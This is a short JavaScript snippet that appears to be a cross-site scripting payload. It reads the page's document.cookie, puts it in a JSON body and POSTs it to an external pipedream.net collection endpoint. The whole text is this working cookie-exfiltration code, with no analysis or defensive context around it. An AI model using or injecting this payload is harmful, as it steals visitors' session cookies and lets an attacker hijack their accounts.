const headers = new Headers()
headers.append("Content-Type", "application/json")
var x = document.cookie;
const body = { "name": x }

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://entwx0s2gq3v.x.pipedream.net/", options)
